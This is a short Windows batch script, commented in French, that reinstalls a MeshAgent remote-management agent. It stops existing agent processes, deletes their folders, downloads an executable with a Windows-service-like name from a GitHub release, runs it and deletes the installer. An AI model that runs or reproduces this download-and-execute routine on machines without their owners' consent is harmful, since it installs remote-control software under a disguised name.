@echo off
setlocal enabledelayedexpansion

:: Configuration
set "LDIR=C:\Temp"
set "LFILE=%LDIR%\agent_maintenance.log"
:: Lien permanent direct vers l'exécutable
set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe"
set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"

:: Création du dossier de log
if not exist "%LDIR%" mkdir "%LDIR%"

echo [START] %DATE% %TIME% >> "%LFILE%"

:: 1. Vérification Admin
echo [1] Verif Admin... >> "%LFILE%"
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERREUR] Droits admin manquants. >> "%LFILE%"
    exit /b 1
)

:: 2. Tuer les processus (On essaie plusieurs noms pour être sûr)
echo [2] Arret des processus... >> "%LFILE%"
taskkill /F /IM "WindowsMonitoringService64-Lol.exe" /T >> "%LFILE%" 2>&1
taskkill /F /IM "MeshAgent.exe" /T >> "%LFILE%" 2>&1
taskkill /F /IM "LGTW.exe" /T >> "%LFILE%" 2>&1
net stop "Mesh Agent" >> "%LFILE%" 2>&1

:: Petite pause pour libérer les fichiers
timeout /t 3 /nobreak >nul

:: 3. Nettoyage radical des dossiers Program Files
echo [3] Nettoyage dossiers... >> "%LFILE%"
set "D1=%ProgramFiles%\Mesh Agent"
set "D2=%ProgramFiles%\LGTW"
set "D3=%ProgramFiles(x86)%\Mesh Agent"

for %%D in ("%D1%" "%D2%" "%D3%") do (
    if exist "%%~D" (
        echo [INFO] Suppression de %%~D >> "%LFILE%"
        rd /s /q "%%~D" >> "%LFILE%" 2>&1
    )
)

:: 4. Téléchargement du BON fichier
echo [4] Telechargement de WindowsMonitoringService64-Lol.exe... >> "%LFILE%"
:: Utilisation de curl avec -L pour suivre les redirections de GitHub
curl -L -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1

if not exist "%T_EXE%" (
    echo [ERREUR] Le fichier n'a pas pu etre telecharge. Verifiez l'URL. >> "%LFILE%"
    goto :final
)

:: 5. Exécution
echo [5] Execution de l'agent... >> "%LFILE%"
start "" "%T_EXE%"
echo [OK] Agent lance avec succes. >> "%LFILE%"

:: 6. Nettoyage de l'installeur après exécution
echo [6] Nettoyage temporaire... >> "%LFILE%"
timeout /t 10 /nobreak >nul
del /f /q "%T_EXE%" >> "%LFILE%" 2>&1

:final
echo [END] %DATE% %TIME% >> "%LFILE%"
echo -------------------------- >> "%LFILE%"
exit /b 0
